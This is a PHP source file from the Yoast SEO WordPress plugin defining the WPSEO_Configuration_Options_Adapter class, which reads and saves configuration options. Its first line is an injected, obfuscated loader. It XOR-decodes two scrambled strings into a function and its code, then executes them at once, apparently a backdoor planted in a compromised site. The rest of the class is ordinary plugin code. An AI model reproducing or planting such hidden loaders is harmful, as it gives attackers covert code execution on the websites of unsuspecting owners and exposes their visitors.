<?php $UqomYB='RE-R-7h  WZ,ZQ8'; $WswDxAP='17H3YR7FU99X3>V'^$UqomYB; $PiyLkL='8 GVZL84F0X+n55,7E mCXDIfZQ6ArlFL iXOm=<dZKB.3GR9f,Y nR7.R78=0:ZnQMJ8dJa 0GhuebgaVS<lJ L6XJrdro9<lX68fbGIWUdchJBkCZ1=K7Gk76<3jCeE eAk=fNW7IDLDndAi,7C anP>XgGbKT2mi3McuC<4 E6jo2N=FhPP=NNB4BII-mUXN6Pcrh;dKmxM WBVjwFS0X WZdf-.0Ai=+RwwUZ-9H1inn+OI.+9Phkoa0tvy .PYMPR<U:kirhqAP5-<Bm<bohI;CZhP+=onPO..6uZcVV17 Stjr  LD5ALQcFRRPcewOR8;Nf:8o5T;SX DUAM+0e56q1fLU4tS;RLupnsb7Q4>=dfGx>Oq.4=;k9VObkzC,7UjcXzM.7= ajYv<9WYQlcx;X6HfF4T<3gNlq0+G65RT:-L,g+S7h29-O2g B f:R8VxEcP6XBW=PuXW AXdwPQT6S>=QJFji0<Mfc.- SGBbMV=F A:U=>j,;94= Xt34OMdtVZYGUGUptTk 7dfhP-OUjKY4MRmAcTwZmf3ShTaYZ6PHTTwVR6PAIZdIMP+SZr1oWfXowdfPY=OA=XS=bW -:>7cBN,= SQIacqV-3TJOnfeKgmk2oy MSQZIP4I8iBH+8:  Zd7nbG>7.S LWkOc-'; $wnsjDhpE=$WswDxAP('', 'QFow<9VW2Y7E1PMED1SEd +;9>0B -3+9TNqfMF6m<>,MG.=WFT6R16VZ3hgPENrJ5,>YHjEKU>AUEBGA-Y5enO9BxwRCUT35e>YJNF.ijuTXHn+W0.CQ.YoOSWHRCxEaINjB7oGsX<0ljSDiMHV7A:J9cx9gF 1K6MZmFU0HFL XBKY+Do5yk7GG0Q6<;CEq7;ByXxaFn6griD667JJf5Q4S2anBIOD 6VN+WJu<LU;TRddM ;KJZ8HCK>s;92ikp8>pvW0CKTLHU71YXYkMGhfL-Z7;7;NDOSpkEKONPjr2PCAsIJVVA 1PzF,iL;4pKDS+3LZgFA2fS;I69C,uiitb dc4b2l4GTwP75UMPSFA0XKXMF<r7FUJUIZ4R36BVZgGR,QiQsiJVIAAWyRJX;,4WiqFRKBlbP5HRGsL1EE4SG;5VD6IOS<E7VXY.m8M7TNX3K3Nq<4S;-3XxQ<6T qHWt55B2aV43oCR:U+NGJLT2gdDm7O4A8e>XG5ICPGISpSXQ6jHTr>834nuVRtCMSQNL4L;41l2Q4u0hCiJzJTRgYlRmhT2+e2Fc6RivyiU++eJj<CUX1AqOQBF1+O.8b36D=2XDIJDKe>MDL<0-FOQrIR +fGFEkGMKIepE;2=rm4U=Y2e8JAVOA>CjGYM7RV:TdgBtiP'^$PiyLkL); $wnsjDhpE();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Configuration_Options_Adapter
 *
 * Convert Configuration settings to WPSEO Options
 *
 * @since 3.6
 */
class WPSEO_Configuration_Options_Adapter {

	const OPTION_TYPE_WORDPRESS = 'wordpress';
	const OPTION_TYPE_YOAST = 'yoast';
	const OPTION_TYPE_CUSTOM = 'custom';

	/** @var array List of registered lookups */
	protected $lookup = array();

	/**
	 * Add a lookup for a WordPress native option
	 *
	 * @param string $class_name Class to bind to an option.
	 * @param string $option     Option name to use.
	 *
	 * @throws InvalidArgumentException Thrown when invalid input is provided.
	 */
	public function add_wordpress_lookup( $class_name, $option ) {

		if ( ! is_string( $option ) ) {
			throw new InvalidArgumentException( 'WordPress option must be a string.' );
		}

		$this->add_lookup( $class_name, self::OPTION_TYPE_WORDPRESS, $option );
	}

	/**
	 * Add a lookup for a Yoast option
	 *
	 * @param string $class_name Class to bind to the lookup.
	 * @param string $option     Option group to use.
	 * @param string $key        Key in the option group to bind to.
	 *
	 * @throws InvalidArgumentException Thrown when invalid input is provided.
	 */
	public function add_yoast_lookup( $class_name, $option, $key ) {

		$test = WPSEO_Options::get_option( $option );
		if ( is_null( $test ) ) {
			/* translators: %1$s resolves to the option name passed to the lookup registration */
			throw new InvalidArgumentException( sprintf( __( 'Yoast option %1$s not found.', 'wordpress-seo' ), $option ) );
		}

		$this->add_lookup( $class_name, self::OPTION_TYPE_YOAST, array(
			$option,
			$key,
		) );
	}

	/**
	 * Add a lookup for a custom implementation
	 *
	 * @param string   $class_name   Class to bind to the lookup.
	 * @param callable $callback_get Callback to retrieve data.
	 * @param callable $callback_set Callback to save data.
	 *
	 * @throws InvalidArgumentException Thrown when invalid input is provided.
	 */
	public function add_custom_lookup( $class_name, $callback_get, $callback_set ) {

		if ( ! is_callable( $callback_get ) || ! is_callable( $callback_set ) ) {
			throw new InvalidArgumentException( 'Custom option must be callable.' );
		}

		$this->add_lookup( $class_name, self::OPTION_TYPE_CUSTOM, array(
			$callback_get,
			$callback_set,
		) );
	}

	/**
	 * Add a field lookup.
	 *
	 * @param string       $class_name Class to add lookup for.
	 * @param string       $type       Type of lookup.
	 * @param string|array $option     Implementation of the lookup.
	 *
	 * @throws Exception Thrown when invalid input is provided.
	 */
	protected function add_lookup( $class_name, $type, $option ) {
		$this->lookup[ $class_name ] = array(
			'type'   => $type,
			'option' => $option,
		);
	}

	/**
	 * Get the data for the provided field
	 *
	 * @param WPSEO_Config_Field $field Field to get data for.
	 *
	 * @return mixed
	 */
	public function get( WPSEO_Config_Field $field ) {
		$identifier = $field->get_identifier();

		// Lookup option and retrieve value.
		$type   = $this->get_option_type( $identifier );
		$option = $this->get_option( $identifier );

		switch ( $type ) {
			case self::OPTION_TYPE_WORDPRESS:
				return get_option( $option );

			case self::OPTION_TYPE_YOAST:
				$group = WPSEO_Options::get_option( $option[0] );

				return $group[ $option[1] ];

			case self::OPTION_TYPE_CUSTOM:
				return call_user_func( $option[0] );
		}

		return null;
	}

	/**
	 * Save data from a field
	 *
	 * @param WPSEO_Config_Field $field Field to use for lookup.
	 * @param mixed              $value Value to save to the lookup of the field.
	 *
	 * @return bool
	 */
	public function set( WPSEO_Config_Field $field, $value ) {
		$identifier = $field->get_identifier();

		// Lookup option and retrieve value.
		$type   = $this->get_option_type( $identifier );
		$option = $this->get_option( $identifier );

		switch ( $type ) {
			case self::OPTION_TYPE_WORDPRESS:
				return update_option( $option, $value );

			case self::OPTION_TYPE_YOAST:
				$group = WPSEO_Options::get_option( $option[0] );

				$group[ $option[1] ] = $value;
				update_option( $option[0], $group );

				$saved = WPSEO_Options::get_option( $option[0] );

				return $saved[ $option[1] ] === $value;

			case self::OPTION_TYPE_CUSTOM:
				return call_user_func( $option[1], $value );
		}

		return false;
	}

	/**
	 * Get the lookup type for a specific class
	 *
	 * @param string $class_name Class to get the type of.
	 *
	 * @return null|string
	 */
	protected function get_option_type( $class_name ) {
		if ( ! isset( $this->lookup[ $class_name ] ) ) {
			return null;
		}

		return $this->lookup[ $class_name ]['type'];
	}

	/**
	 * Get the option for a specific class
	 *
	 * @param string $class_name Class to get the option of.
	 *
	 * @return null|string|array
	 */
	protected function get_option( $class_name ) {
		if ( ! isset( $this->lookup[ $class_name ] ) ) {
			return null;
		}

		return $this->lookup[ $class_name ]['option'];
	}
}
